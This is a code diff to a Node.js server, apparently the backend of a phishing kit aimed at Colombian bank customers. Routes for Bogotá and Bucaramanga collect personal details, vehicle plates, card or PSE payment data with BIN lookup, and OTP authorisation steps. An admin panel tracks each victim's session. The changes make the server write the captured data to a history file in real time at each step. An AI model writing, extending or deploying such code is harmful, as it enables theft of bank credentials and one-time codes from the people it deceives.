@@ -400,10 +400,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // ============================================================
-        // 🔥 FIX: Guardar datos del formulario en tiempo real
-        // Actualiza pasosSesiones y ultimaAccionSesiones para que el admin lo muestre
-        // ============================================================
         const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
         if (req.method === 'POST' && consultaMatch) {
             try {
@@ -442,9 +438,18 @@ const server = http.createServer(async (req, res) => {
                 guardarSesionesTemporales();
                 datosSesiones.set(sessionId, datosCompletos);
 
+                // 🔥 FIX: Guardar/Actualizar en el historial en tiempo real
+                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
+                if (idx !== -1) {
+                    historial[idx].datos = datosCompletos;
+                    historial[idx].fecha = new Date().toISOString(); // Actualizar la hora
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial(bancoKey, datosCompletos);
+                }
+
                 if (!estadoSesiones.has(sessionId)) estadoSesiones.set(sessionId, 'pendiente');
 
-                // 🔥 FIX: Actualizar el paso y la última acción para que el admin lo muestre
                 const tienePersonales = datosCompletos.datosPersonales && datosCompletos.datosPersonales.primerNombre;
                 const tienePlacas = Array.isArray(datosCompletos.placasData) && datosCompletos.placasData.length > 0;
 
@@ -509,7 +514,17 @@ const server = http.createServer(async (req, res) => {
                 let pasoActual = pasosSesiones.get(sessionId) || 'pagodesubsidio';
                 if (marca === 'PSE') pasoActual += ' (PSE)'; else pasoActual += ' (Tarjeta)';
                 pasosSesiones.set(sessionId, pasoActual);
-                guardarHistorial(bancoKey, datosSesion);
+                
+                // 🔥 Actualizar historial también aquí por si acaso
+                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
+                if (idx !== -1) {
+                    historial[idx].datos = datosSesion;
+                    historial[idx].fecha = new Date().toISOString();
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial(bancoKey, datosSesion);
+                }
+                
                 delete sesionesTemporales[sessionId];
                 guardarSesionesTemporales();
                 json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
@@ -529,7 +544,16 @@ const server = http.createServer(async (req, res) => {
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosCompletos);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-                guardarHistorial(bancoKey, datosCompletos);
+                
+                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
+                if (idx !== -1) {
+                    historial[idx].datos = datosCompletos;
+                    historial[idx].fecha = new Date().toISOString();
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial(bancoKey, datosCompletos);
+                }
+                
                 json(res, 200, { ok: true, sessionId, bancoKey });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -547,7 +571,16 @@ const server = http.createServer(async (req, res) => {
                 datosSesiones.set(sessionId, datosCompletos);
                 estadoSesiones.set(sessionId, 'autorizacion_enviada');
                 ultimaAccionSesiones.set(sessionId, 'AUTORIZAR');
-                guardarHistorial(bancoKey, datosCompletos);
+                
+                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
+                if (idx !== -1) {
+                    historial[idx].datos = datosCompletos;
+                    historial[idx].fecha = new Date().toISOString();
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial(bancoKey, datosCompletos);
+                }
+
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
